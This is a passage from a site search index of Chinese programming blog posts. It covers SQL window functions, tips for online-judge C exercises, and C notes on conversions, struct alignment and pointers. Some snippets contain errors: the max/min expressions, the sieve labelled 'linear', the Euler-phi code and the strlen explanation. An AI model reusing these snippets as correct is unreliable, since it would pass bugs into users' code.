CUBE -- 取得全部组合的聚合结果: 2^(列名数) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 -- e.g. SELECT product_name, product_type, sale_price, RANK () OVER (ORDER BY sale_price) AS ranking FROM Product ORDER BY ranking; SELECT product_type, regist_date, SUM(sale_price) AS sum_price FROM Product GROUP BY ROLLUP(product_type, regist_date); SELECT CASE WHEN GROUPING(product_type) = 1 THEN \u0026#39;商品种类 合计\u0026#39; ELSE product_type END AS product_type, CASE WHEN GROUPING(regist_date) = 1 THEN \u0026#39;登记日期 合计\u0026#39; ELSE CAST(regist_date AS VARCHAR(16)) END AS regist_date, SUM(sale_price) AS sum_price FROM Product GROUP BY ROLLUP(product_type, regist_date); 进阶查询技巧 RDB ","date":"2023-09-24T00:00:00Z","permalink":"https://example.com/p/sql%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"SQL快速入门"},{"content":" 主要给出了WA时可能会出现的错误, 节省调试时间, 并方便日后回顾; 建议提交一次后对照查询, 其他问题请本地调试解决. Hello World 略.\nA+B 略.\n数据类型大小及范围 可使用switch-case进行条件判断.\n使用CHAR_MAX等宏时, 注意包含头文件\u0026lt;limits.h\u0026gt;.\n平均值 直接相加可能会越界.\n1 int avg = ((a-b)\u0026gt;\u0026gt;1)+b; 进制转换 输出大写十六进制需使用\u0026quot;%X\u0026quot;, \u0026ldquo;%x\u0026quot;会输出小写十六进制.\n浮点数输出 略.\n动态宽度输出 可使用\u0026quot;tmp/10\u0026quot;做十进制向右移位获取输入数字长度.\n1 2 3 4 5 6 cnt = 0, tmp = n; while(tmp){ tmp /= 10; ++cnt; } if (!n) cnt = 1; 计算地球上两点之间的距离 C中三角函数仅接收弧度参数, 需先将经纬度转换为弧度.\n1 2 #define Pi 3.1415926 phi1 = phi1*PI/180; 风寒指数 输出要求四舍五入, 只做类型转换是截断.\n1 int chillInt = (int)(chillDouble+0.5f); 颜色模型转换 取最大值和最小值, 可使用比较运算符.\n1 2 int max = r \u0026gt;= g ? (r \u0026gt;= b ? r : b) : (r \u0026gt;= b ? r : b); int min = r \u0026lt;= g ? (r \u0026lt;= b ? r : b) : (r \u0026lt;= b ? r : b); 如果使用浮点型比较, 浮点数不精确, 不能直接使用\u0026quot;a == b\u0026rdquo;, 应当使用\u0026quot;a-b \u0026lt; 1e-9\u0026quot;.\n如果使用整型比较, 计算时应当进行类型转换(强制或隐式), 否则\u0026quot;/\u0026ldquo;左右操作数均为整数时只能得到整数.\n此外, 每个除数都应当判断不为0.\n乘数模 直接相乘可能会越界, 先取模再相乘再取模.\n1 r = ((a%m)*(b%m))%m; 方阵 可使用比较运算符得到矩阵元素. 无需使用数组.\n1 a = (col-raw) ? (col-raw) : (raw-col); // a[col][raw] 分数的加、减、乘、除法 可使用\u0026quot;getchar();\u0026ldquo;取走输入中的\u0026rdquo;/\u0026rdquo;.\n约分时, 可使用辗转相除法得到分子分母最大公因数, 再分别除掉.\n1 2 3 4 int gcd(int a,int b){ if (b == 0) return a; else return gcd(b,a%b); } 结果中若出现负分数, 只需保证最大公因数为正即可.\n1 2 int d = gcd(m,n); d = d \u0026gt; 0 ? d : -d; 操作数 同“动态宽度输出”, \u0026ldquo;%10\u0026quot;可以得到个位数, \u0026ldquo;/10\u0026quot;可以十进制下向右移动一位.\n组合数 动态规划题, 但由于 $n\\leq 50$, 暴搜不会超时.\n比率 \u0026ldquo;*10\u0026quot;实现十进制下向左移动一位, 直到变成整数, 判断不是整数可使用\u0026quot;x != floor(x)\u0026rdquo;.\n得到最大公因数并约分, 同\u0026quot;分数的加、减、乘、除法\u0026rdquo;.\n级数和 \u0026ldquo;/10\u0026quot;实现十进制下右移一位, 直到没有整数部分, 判断有整数部分可使用\u0026rdquo;(int)x\u0026rdquo;.\n舍去末尾的0, 可使用\u0026quot;%g\u0026quot;格式化输出.\n对称数 \u0026ldquo;fget(num,11,stdin)\u0026ldquo;获取数字为字符串, 并替换掉末尾换行符.\n1 2 char *find = strchr(num,\u0026#39;\\n\u0026#39;); // strchr()在头文件\u0026lt;string.h\u0026gt;中 if(find) *find = \u0026#39;\\0\u0026#39;; 使用\u0026quot;strlen()\u0026ldquo;获取长度, 也需引入头文件\u0026lt;string.h\u0026gt;.\n翻转分为数字改变和位置改变. 数字(实则为字符)改变为: \u0026lsquo;6\u0026rsquo;-\u0026gt;\u0026lsquo;9\u0026rsquo;, \u0026lsquo;9\u0026rsquo;-\u0026gt;\u0026lsquo;6\u0026rsquo;, \u0026lsquo;0\u0026rsquo;-\u0026gt;\u0026lsquo;0\u0026rsquo;, \u0026lsquo;1\u0026rsquo;-\u0026gt;\u0026lsquo;1\u0026rsquo;, \u0026lsquo;8\u0026rsquo;-\u0026gt;\u0026lsquo;8\u0026rsquo;. 位置改变为第i位换到第(len-i-1)位.\n可使用switch-case翻转后再逐位判断, 或直接判断; 包含其他数字时(default)则直接输出\u0026quot;No\u0026rdquo;.\n偷分寄巧: 由于该题样例只有三位数, 可直接暴力判断\n1 2 3 4 5 6 7 8 9 10 int a = (n/100)%10; int b = (n/10)%10; int c = n%10; if ((b == 0 || b == 1 || b == 8) \u0026amp;\u0026amp; ((a == 6 \u0026amp;\u0026amp; c == 9) || (a == 9 \u0026amp;\u0026amp; c == 6) || ((a == 0 || a == 1 || a == 8) \u0026amp;\u0026amp; (c == 0 || c == 1 || c == 8)))){ printf(\u0026#34;Yes\\n\u0026#34;); } else { printf(\u0026#34;No\\n\u0026#34;); } 幂数模 直接求幂再求模可能会越界超时, 须使用快速模幂.\n$b=2k$ 时, 有 $a^b\\equiv(a^k)^2 ({\\rm mod}\\ m)$; $b=2k+1$ 时, 有 $a^b\\equiv(a^k)^2\\times a ({\\rm mod}\\ m)$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 typedef unsigned long long uint64; uint64 fastPowerMod (uint64 t, uint64 e, uint64 m){ uint64 r = 1; while (e){ if (e\u0026amp;1){ r = (r*t)%m; } t = (t*t)%m; e \u0026gt;\u0026gt;= 1; } return r; } 倍数和 输入采用动态数组或足够大的数组或直接循环均可.\n1 2 3 4 5 6 7 8 unsigned int t; scanf(\u0026#34;%u\u0026#34;,\u0026amp;t); // 以下四种方法任选其一 unsigned int n[t]; // 1. MSVC会报错, 但GCC支持, 可以AC unsigned int *n = (unsigned int *)malloc(t*sizeof(unsigned int)); // 2. MSVC和GCC均支持, 但需引入头文件\u0026lt;malloc.h\u0026gt; unsigned int n[100000] // 3. 足够大的数组, 不会溢出, 不会超出内存限制 for (unsigned int i = 1; i \u0026lt;= t; ++i); // 4. 循环读取输入并输出 暴搜, 不会超时.\n余数和 输入顺序.\n最大数字 条件为小于或等于 $n$.\n倒水 使用BFS(广度优先), 将水杯状态视为顶点, 状态间的转移即为边, 每次转移相对(初始状态)距离加1; $(0,0)$为初始状态, 检索到 $(0,d)$ 或 $(d,0)$ 时终止, 此时距离矩阵中对应元素值即为最小操作次数.\n1 2 3 4 5 6 #include \u0026lt;string.h\u0026gt; #define INF 0x3f3f3f3f // 无穷大, 表示未检索 int distTable[10000][10000]; // 距离矩阵 memset(distTable, 0x3f, sizeof(distTable)); // 初始化 distTable[0][0] = 0; // 设置初始状态 每次状态转移共有八种情况: (记左为0, 右为1)\n装满0: $(a,b)\\to (n,b)$; 装满1: $(a,b)\\to (a,m)$; 倒空0: $(a,b)\\to (0,b)$; 倒空1: $(a,b)\\to (a,0)$; 0倒入1, 1未满: $(a,b)\\to (0,a+b)$, $a+b\u0026lt;m$; 0倒入1, 1已满: $(a,b)\\to (a+b-m,m)$, $a+b\\geq m$; 1倒入0, 0未满: $(a,b)\\to (a+b,0)$, $a+b\u0026lt;n$; 1倒入0, 0已满: $(a,b)\\to (n,a+b-n)$, $a+b\\geq n$. 使用数组表示循环队列, 当前状态为队首, 转移后插入至队尾.\n1 2 3 4 5 6 7 8 9 #define MAXSIZE 10000 int queue[MAXSIZE][2] = {0}; // 循环队列并初始化 int head = 0; // 队首指向0 int tail = 1; // 队尾指向1 // 移动队首队尾时用取余实现循环效果 head = (head+1)%MAXSIZE tail = (tail+1)%MAXSIZE 好数字 同幂数模.\n$$\\frac{n+1}{2} = \\begin{cases} k, \\ n=2k \\\\ k+1, \\ n=2k+1 \\\\ \\end{cases}$$\n毕达哥拉斯三元组 不妨设 $a$ 为短直角边, $b$ 为长直角边; 则 $a\\in (0,\\frac{n}{4})$, $b\\in [a,\\frac{n}{2})$.\n$a\\times b\\times c$可能越界, 使用unsigned long long.\n竖式乘法 \u0026ldquo;/10\u0026quot;获取位数\u0026quot;len(num)\u0026rdquo;.\n获取右数第 $n$ 位数字.\n1 2 3 4 #include \u0026lt;math.h\u0026gt; x /= (uint)pow(10,n-1); x %= 10; 总宽度为\u0026quot;lenTotal = len(ans)+1;\u0026rdquo;, 加算中第 $i$ 列空格数为 \u0026ldquo;j \u0026lt;= lenTotal-len(current)-(i-1);\u0026rdquo; 亦即 \u0026ldquo;j \u0026lt; lenTotal-len(current)-i\u0026rdquo;.\n查找数列 写成下三角形式, 第 $n$ 列末尾项数为 $1+2+\u0026hellip;+n$.\n1 2 3 4 5 6 7 cnt = 1, sum = 0; while(n-sum \u0026gt; 0){ sum += cnt; ++cnt; } sum -= cnt; ans = n-sum == 0 ? cnt : (n-sum-1); 俄罗斯农夫乘法 在循环输出中判断并累加即可.\n阶乘倍数 枚举阶乘模可能会超时, 可以改为对 $k$ 因子分解后二分查找.\n可以使用两个数组记录因子分解情况再二分查找, 也可以在二分查找过程中不断分解 $k$.\n正整数均有唯一分解形式: $k=\\prod p_i^{\\alpha_i}$, $p_i$ 为素数.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 typedef unsigned long long uint64; uint64 pFactNum = 0; // 素因子个数 uint64 prime[20] = {0}, exponent[20] = {0}; // 前19个素数相乘已经非常大了 for (uint64 i = 2; i*i \u0026lt;=k; ++i){ if (k%i == 0){ prime[++pFactNum] = i; while (k%i == 0){ ++exponent[pFactNum]; k /= i; } } } // 无法分解, 说明k为素数 if (k\u0026gt;1) { prime[++pFactNum] = k; ++exponent[pFactNum]; } 匹配时, $n!$ 中含有素因子个数($\\lfloor\\frac{n}{p}\\rfloor+\\lfloor\\frac{n}{p^2}\\rfloor+\u0026hellip;$)应当超过 $k$ 中对应素因子的指数.\n1 2 3 4 5 6 uint64 primeNum = 0, tmp = n; // n!中含有k的第i个素因子的个数 while(tmp) { primeNum += tmp/prime[i]; tmp /= prime[i]; } 二分查找时, 中间值满足条件说明在左区间, 不满足则在右区间; 可以使用开区间或闭区间, 但均须保证不重不漏, 并避免死循环.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int64 left = 1, right = 1e19, mid, ans; // 闭区间 while (left \u0026lt;= right){ mid = ((right-left)\u0026gt;\u0026gt;1)+left; if (1){ right = mid-1; ans = mid; } else { left = mid+1; } } // 开区间 while (left+1 \u0026lt; right){ mid = ((right-left)\u0026gt;\u0026gt;1)+left; if (1){ right = mid; ans = mid; } else { left = mid; } } 方案数 枚举首项可能会超时, 可以改为枚举项数.\n不妨设存在时, 首项为 $a$, 项数为 $m$, 有 $\\frac{m(2a+m-1)}{2}=n$, 即 $a=\\frac{n-m(m-1)/2}{m}\\geq 1$. 故存在时有 $m|n-m(m-1)/2$ 和 $m\u0026lt;\\sqrt{2n}$.\n哈沙德数 易知 $n=10^k$ 或 $1\\leq n\\leq 9$ 时会导致死循环, 在HarshadNumber中添加\u0026quot;if (s == 1) return 1;\u0026rdquo;, 并修改while.\n1 2 3 4 5 6 int cnt = 0; if (n == 1) cnt = 1; while ((n != 0) \u0026amp;\u0026amp; (n != 1)) { n = HarshadNumber(n); if (n) ++cnt; } 素数 根据题目提示可以得到埃氏筛法, 但埃氏筛法中形如 $p_1\u0026hellip;p_k$ 的数会被素数 $p_1,\u0026hellip;,p_k$ 反复筛取导致时间较长. 可使用数组存储每个数被筛情况, 即线性筛.\n1 2 3 4 5 6 7 8 9 10 11 12 void prime(uint64 n){ bool isPrime[n+1]; memset(isPrime,1,n+1); // 需引入头文件\u0026lt;string.h\u0026gt; uint64 cnt = 0; for (uint64 i = 2; i \u0026lt;= n; ++i){ if (isPrime[i]){ for (uint64 j = 2; j*i \u0026lt;= b; ++j){ isPrime[j*i] = false; // 线性筛 } } } } 基思数 可使用循环数组存储数列, 存储时低位在左端, 高位在右端, 从右到左循环遍历.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int arr[8] = {0}; // 最大位数为8 int len = 0, tmp = n; while (tmp){ arr[len++] = tmp%10; // 低位在左端, 高位在右端 tmp /= 10; } int i = len - 1; while (arr[i] \u0026lt; n){ int sum = 0; for (int j = 0; j \u0026lt; len; ++j) { sum += arr[(i-j+len)%len]; // 从右到左遍历 } arr[i] = sum; i = (i-1+len)%len; // 左移 } 二进制表示 递归函数实现, 从高位依次取二进制位, 超过范围时进入递归, 设置标识判断何时输出加号.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 bool flag = false; for (int i = 15; i \u0026gt;= 0 ; --i) { if ((a\u0026gt;\u0026gt;i)\u0026amp;1) { if (flag) printf(\u0026#34;+\u0026#34;); if (i \u0026gt;= 2){ printf(\u0026#34;2(\u0026#34;); binary(i); printf(\u0026#34;)\u0026#34;); } if (i == 1) printf(\u0026#34;2\u0026#34;); if (i == 0) printf(\u0026#34;2(0)\u0026#34;); flag = true; } } 光线追踪 反射经过的三边总长相等(否则无法回到入射点), 即可以通过平移得到等边三角形; 每轮反射时相当于累加更相减损的结果, 或说Euclid算法减去余数部分; 而最终余数为 ${\\rm gcd}(n,x)$, 故总长度为 $3(n-{\\rm gcd(n,x)})$.\n使用\u0026quot;unsigned int\u0026quot;.\n冰雹数列 最后一位不能有空格.\n佩尔数 略.\n可变参数累加 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdarg.h\u0026gt; void func([typename] start, ...){ va_list vaList; \\\\ 初始化参数列表 va_start(vaList,start); \\\\ 开始参数列表 [typename] curr = start; while(curr != num){ \\\\ 读到num时停止循环 curr = va_arg(vaList,[typename]); \\\\ 获取参数列表中下一个参数 } va_end(vaList) \\\\ 结束参数列表 } 运动会 以队长为原点构建平面直角坐标系, 观察可得所求即互素对 $(x,y)$, $1\\leq x,y\\leq N-1$ 个数, 即 $2\\sum_{i=1}^{n-1}\\varphi(i)+1$. $\\varphi(n)$ 为Euler函数, 含义为所有小于 $n$ 且与 $n$ 互素的数的个数.\nEuler函数满足如下性质:\n若素数 $p|n$, 则 $\\varphi(pn)=p\\varphi(n)$; 若素数 $p\\nmid n$, 则 $\\varphi(pn)=(p-1)\\varphi(n)$; 若 ${\\rm gcd}(m,n)=1$, 则 $\\varphi(m,n)=\\varphi(m)\\varphi(n)$; 若 $n=\\prod_{i=1}^k p_i^{\\alpha_i}$, 则 $\\varphi(n)=n\\prod_{i=1}^k(1-\\frac{1}{p_i})$. 在 $n$ 较小时, 可使用线性筛节省时间; 在 $n$ 较大时, 可使用因式分解节省空间.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 void phiEuler(int n){ int phi[n+1],prime[n+1]; bool isSieved[n+1]; int sum = 0, cnt = 1, comp; prime[0] = 1; phi[1] = 1; for (int i = 2; i \u0026lt; n; ++i){ if (!isSieved[i]){ prime[cnt++] = i; phi[i] = i-1; // Euler函数性质 } for (int j = 1; i*prime[j] \u0026lt;= n; ++j){ comp = i*prime[j]; isSieved[comp] = true; // 线性筛 if (i%prime[j] == 0){ phi[comp] = prime[j]*phi[i]; // Euler函数性质 break; } else{ phi[comp] = (prime[j]-1)*phi[i]; // Euler函数性质 } } } } 可变参数平均 1 2 3 4 5 6 7 8 void func(int num, ...){ va_list vaList; \\\\ 初始化参数列表 va_start(vaList,start); \\\\ 开始参数列表 for (int i = 0; i \u0026lt; num; ++i){ \\\\ 读取num个后停止循环 [typename] curr = va_arg(vaList,[typename]); \\\\ 获取参数列表中下一个参数 } va_end(vaList) \\\\ 结束参数列表 } ","date":"2023-09-19T00:00:00Z","permalink":"https://example.com/p/nojc%E6%98%93%E9%94%99%E6%80%BB%E7%BB%93/","title":"NOJ(C)易错总结"},{"content":" (C11 - GCC13.1.0/MSVC1937) 内容不分先后顺序, 请按需查阅. CMAKE 使用CLion或VS时, 可以考虑如下CMAKE配置; 会自动获取项目名与文件名, 每次修改项目名文件名或新建文件时, 只需重新加载CMAKE.\n1 2 3 4 5 6 7 8 9 10 11 12 13 cmake_minimum_required(VERSION 3.26) get_filename_component(ProjectId ${CMAKE_CURRENT_SOURCE_DIR} NAME) string(REPLACE \u0026#34; \u0026#34; \u0026#34;_\u0026#34; ProjectId ${ProjectId}) project(${ProjectId} C) set(CMAKE_C_STANDARD 11) file(GLOB files \u0026#34;${CMAKE_CURRENT_SOURCE_DIR}/*.c\u0026#34;) foreach(file ${files}) get_filename_component(name ${file} NAME) add_executable(${name} ${file}) endforeach() 添加头文件:\n1 include_directories(\u0026#34;头文件相对路径\u0026#34;) 此外, 还可以修改C标准版本:\n1 set(CMAKE_C_STANDARD 99) 一个方便调试的头文件 该头文件中定义用变长参数定义了一系列输出函数, 可以直接采用\u0026quot;PRINT_TYPE(variable);\u0026ldquo;的形式来打印对应类型的变量并换行. 传入数组时, 传入的是数组的首位指针, 还需在外部获取数组长度一并传入.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #ifndef BASICC_IO_UTILS_IO_UTILS_H_ #define BASICC_IO_UTILS_IO_UTILS_H_ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;limits.h\u0026gt; void PrintBinary(unsigned int value); //#define PRINT_METADATA #ifdef PRINT_METADATA # define PRINTLNF(format, ...) printf(\u0026#34;(\u0026#34;__FILE__\u0026#34;:%d) %s: \u0026#34;format\u0026#34;\\n\u0026#34;, __LINE__, __FUNCTION__ , ##__VA_ARGS__) #else # define PRINTLNF(format, ...) printf(format\u0026#34;\\n\u0026#34;, ##__VA_ARGS__) #endif #define PRINT_CHAR(char_value) PRINTLNF(#char_value\u0026#34;: %c\u0026#34;, char_value) #define PRINT_WCHAR(char_value) PRINTLNF(#char_value\u0026#34;: %lc\u0026#34;, char_value) #define PRINT_INT(int_value) PRINTLNF(#int_value\u0026#34;: %d\u0026#34;, int_value) #define PRINT_LONG(long_value) PRINTLNF(#long_value\u0026#34;: %ld\u0026#34;, long_value) #define PRINT_LLONG(long_value) PRINTLNF(#long_value\u0026#34;: %lld\u0026#34;, long_value) #define PRINT_BINARY(int_value) PrintBinary((unsigned int) int_value); #define PRINT_HEX(int_value) PRINTLNF(#int_value\u0026#34;: %#x\u0026#34;, int_value) #define PRINT_BOOL(bool_value) PRINTLNF(#bool_value\u0026#34;: %s\u0026#34;, bool_value ? \u0026#34;true\u0026#34; : \u0026#34;false\u0026#34;) #define PRINT_DOUBLE(double_value) PRINTLNF(#double_value\u0026#34;: %g\u0026#34;, double_value) #define PRINT_STRING(string_value) PRINTLNF(#string_value\u0026#34;: %s\u0026#34;, string_value) #define PRINT_ARRAY(format, array, length) \\ { int array_index; \\ for (array_index = 0; array_index \u0026lt; length; ++array_index) { \\ printf(format, array[array_index]); \\ };\\ printf(\u0026#34;\\n\u0026#34;); } #define PRINT_INT_ARRAY_LN(array, length) \\ { int i; \\ for (i = 0; i \u0026lt; length; ++i) { \\ PRINTLNF(#array\u0026#34;[%d]: %d\u0026#34;, i, array[i]); \\ }} #define PRINT_INT_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%d, \u0026#34;, array, length) #define PRINT_CHAR_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%c, \u0026#34;, array, length) #define PRINT_DOUBLE_ARRAY(array, length) PRINT_ARRAY(\u0026#34;%g, \u0026#34;, array, length) #endif //BASICC_IO_UTILS_IO_UTILS_H_ 来自: https://www.bennyhuo.com/\n赋值语句 在赋值语句中, 左值(\u0026quot;=\u0026ldquo;左边)必须是一个变量或说内存, 不能为数值; 右值(\u0026quot;=\u0026ldquo;右边)可以为数值或变量.\n1 2 3 4 5 int *p = \u0026amp;a; *p = 2; // 合法 *(p+1) = 3; // 合法 \u0026amp;a = p; // 非法, \u0026amp;a为变量a的地址, 是数值 *p+1 = 4; // 非法, *p解引用, *p+1为p指向的内存中的数据+1, 是数值 1 2 3 4 5 int array[] = {0,1,2,3}; int *p = array; *p = 10; // 合法 *p++ = 20; // 合法 *++p = 30; // 合法 不同数据类型的运算 整型提升: 表达式中存在(unsigned) int, 则 (unsigned) char, (unsigned) short int, enum 均转换为int, 不足时转换为 unsigned int.\n1 2 3 4 5 6 7 8 9 10 #include\u0026lt;stdio.h\u0026gt; int main(){ char ch = \u0026#39;a\u0026#39;; short st = 4; int i = 0; printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(ch+st),sizeof(i)); return 0; } 隐式转换: 算术表达式: 低类型转换为高类型, int -\u0026gt; unsigned int -\u0026gt; long -\u0026gt; unsigned long -\u0026gt; long long -\u0026gt; unsigned long long -\u0026gt; float -\u0026gt; double -\u0026gt; long double; 赋值表达式: 右值转换为左值; 函数传参: 实参转换为形参; 函数返回值: 表达式转换为返回值. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include\u0026lt;stdio.h\u0026gt; int main(){ int i = 0; unsigned int ui = 0; long l = 1; long long ll = 2; float f = 0.1f; double d = 0.2f; printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(i+l),sizeof(l)); printf(\u0026#34;%llu %llu %llu \\n\u0026#34;,sizeof(l+ll),sizeof(ui+ll),sizeof(ll)); printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(ll*f),sizeof(f)); printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(f+d),sizeof(d)); short s = d*ll; printf(\u0026#34;%llu\\n\u0026#34;,sizeof(s)); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 #include\u0026lt;stdio.h\u0026gt; double func(int a){ printf(\u0026#34;%llu\\n\u0026#34;,sizeof(a)); return a; } int main(){ double a = 2.9f; printf(\u0026#34;%llu\\n\u0026#34;,sizeof(func(a))); printf(\u0026#34;%f\u0026#34;, func(a)); return 0; } 强制类型转换: (类型名) 表达式\n1 2 3 4 5 6 7 8 9 10 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 17, b = 5; double c = a/b; double d = (double)a/b; printf(\u0026#34;%f %f\u0026#34;,c,d); return 0; } 应用: 模平方时防止越界\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 104560; int m = 1307; int b = (a*a)%m; int c = (1LL*a*a)%m; int d = ((long long)a*a)%m; printf(\u0026#34;%d %d %d\u0026#34;,b,c,d); return 0; } 内存对齐 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;stdio.h\u0026gt; int main(){ typedef struct { char sch1; char sch2; int si; short ss; double sd; } Align; char ch; int i; short s; double d; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); printf(\u0026#34;%llu\\n\u0026#34;, sizeof(ch)+ sizeof(ch)+ sizeof(i)+ sizeof(s)+ sizeof(d)); return 0; } 发现结构体内部变量占用空间加起来仅为16个字节, 但结构体占用24个字节, 这就涉及到结构体的内存对齐.\nchar占用1字节, 对齐到1的倍数; int占用4字节, 对齐到4的倍数; double占用8字节, 对齐到8的倍数. 尽管内存以字节为基本单位, 但CPU会以4字节, 8字节, 甚至16字节进行访问; 在没有对齐机制时, 访问到正确的变量位置需要额外操作. 内存对齐系数由编译器决定, 结构体占用内存为对齐系数倍数. GCC和MSVC中默认对齐系数均为4, 可以通过预编译\u0026rdquo;#pragma pack(n)\u0026ldquo;来改变.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; #pragma pack(2) int main(){ typedef struct { char sch1; char sch2; int si; short ss; double sd; } Align; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); return 0; } 但通常不建议改变对齐系数, 为了使结构体占用更小内存, 应当将占用较小的变量统一排在前面, 如将上述结构体修改为:\n1 2 3 4 5 6 7 8 9 10 11 int main(){ typedef struct { char sch1; char sch2; short ss; int si; double sd; } Align; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); return 0; } 动态数组 有时在声明数组时无法确定数组长度, 需要传入参数.\n1 2 3 4 5 6 7 #include \u0026lt;stdio.h\u0026gt; int main(){ int n = 3; int a[n]; return 0; } GCC可以编译通过; 但MSVC不支持变长数组, 会报错. 可以考虑用内存分配函数实现, 调用方式同数组.\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; int main(){ int n = 3; int *a = (int*)malloc(n*sizeof(int)); a[0] = 1; printf(\u0026#34;%d\u0026#34;,a[0]); free(a); a = NULL; return 0; } 深入理解指针 声明变量时, 如\u0026quot;int a;\u0026rdquo;, 在运行时会为变量a开辟一块内存空间, 但值不能确定. 用scanf写入时, 用\u0026rdquo;\u0026amp;a\u0026quot;表示写入到变量a所在的地址. 地址的数据类型即为指针类型, 即指针类型的变量存放的数据为内存地址.\n数据类型包含两个信息: 内存占用大小; 读写时遵循的规则. 定义一个指针类型时, 还需要给出指向的数据类型. 这是因为指针仅指向一个内存单元, 也就是CPU读写的起始位置(小端序下的数据低位); 只有给出指向的数据类型, CPU才能知道读写的终止位置和读写遵循的规则.\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main(){ long long a = 0x0A0B0C0D; long long* p1 = \u0026amp;a; int* p2 = \u0026amp;a; // 在本行打断点调试, 在CLion或VS的Memory View中输入\u0026amp;a查看内存位置, 并对比Threads \u0026amp; Variables中p1,p2的值 return 0; } 此外, 指针类型的占用空间取决于CPU寻址方式, 与指向的数据类型无关.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int main(){ char a; short b; int c; double d; char *pa = \u0026amp;a; short *pb = \u0026amp;b; int *pc = \u0026amp;c; double *pd = \u0026amp;d; printf(\u0026#34;%llu %llu %llu %llu\u0026#34;,sizeof(pa),sizeof(pb),sizeof(pc),sizeof(pd)); return 0; } 无歧义地, 指针类型和指针类型变量均简称为指针.\n1 2 3 4 // 指针存放的是地址, 以下显然是合法的. int a; int *p = \u0026amp;a; scanf(\u0026#34;%d\u0026#34;,p); 显然\u0026quot;int **p\u0026quot;意为指向\u0026quot;int *\u0026ldquo;类型的指针, \u0026ldquo;int ***p\u0026quot;意为指向\u0026quot;int **\u0026ldquo;类型的指针. \u0026ldquo;*p\u0026quot;含义为解引用, 即读写指针p指向的内存.\n在使用指针时, 应当避免出现野指针, 即指向非法内存的指针.\n1 2 3 // 使用未初始化的指针 int *p; printf(\u0026#34;%d\u0026#34;,*p); 1 2 3 4 // 释放指针后未置空 int *p = (int*)malloc(sizeof(int)); free(p); printf(\u0026#34;%d\u0026#34;,*p); 1 2 3 4 5 6 7 8 9 // 指向对象已消亡(超出变量作用域) int *Address(void){ int a = 10; return \u0026amp;a; } void getAddress(void){ int *p = Address(); printf(\u0026#34;%d\u0026#34;,*p); } 1 2 3 4 5 // 指针赋值为无法读取的内存 int *p = (int *) 0x100000; printf(\u0026#34;%d\u0026#34;,*p); // Windows进程内存空间地址从0x400000开始 // 但考虑到平台不同时进程起始位置不同, 通常不建议赋值为具体地址 指针也可以进行加减运算, 含义为指向前后的内存, 移动单位取决于指向的数据类型.\n1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; int main(){ double a = 0.0f; double *p = \u0026amp;a; printf(\u0026#34;%u %u %u %llu\u0026#34;,p-1,p,p+1,sizeof(a)); return 0; } 数组是连续的内存, 由此想到可以通过数组指针来调用数组, 同时数组变量名本质上也是指针.\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; int main(){ int array[] = {0,1,2,3}; int *p = array; printf(\u0026#34;%d %d %d %d %d\\n\u0026#34;,array[2],p[2],*(p+2),*(array+2),2[array]); // 考虑到可读性, 仅推荐array[2]和p[2]两种调用方式. int arr[4][2] = {0}; printf(\u0026#34;%x,%x\u0026#34;,\u0026amp;arr[3][1],*(arr+3)+1); // C中二维数组行优先. return 0; } 指针自然也可以作为函数参数. 调用函数赋值时, 如\u0026quot;int a = func(b);\u0026rdquo;, CPU将函数返回值复制到寄存器中, 再将寄存器中的数据复制到要改变的变量, 这一过程也就体现为变量的作用域. C可以返回结构体, 同时无法直接返回数组, 不使用指针时可以将数组包含在结构体中; 而若直接返回结构体, 结构体由于本身占用较大, 复制两次导致性能开销过大. 此时, 可以在函数外声明结构体或数组, 并将指向结构体的指针或数组传入.\n函数也存在地址, 自然也可以有指向函数的指针. 但声明函数指针时, 运算优先级问题往往让人感到困惑: 如参数列表\u0026rdquo;()\u0026ldquo;的优先级高于\u0026rdquo;*\u0026rdquo;. 在分析函数声明时, 可以借助网站: https://cdecl.org/.\n字符串长度 C中字符串应以\u0026quot;NULL\u0026rdquo;(或\u0026rdquo;\\0\u0026quot;或0)结尾, 字符串的长度应当包含结尾的\u0026quot;NULL\u0026quot;, 但使用\u0026lt;string.h\u0026gt;库中的\u0026quot;strlen()\u0026ldquo;函数时, 返回的是字符串的有效长度: 如在第n-1位遇到NULL, 则返回n.\n1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(){ char a[20] = \u0026#34;string\u0026#34;; 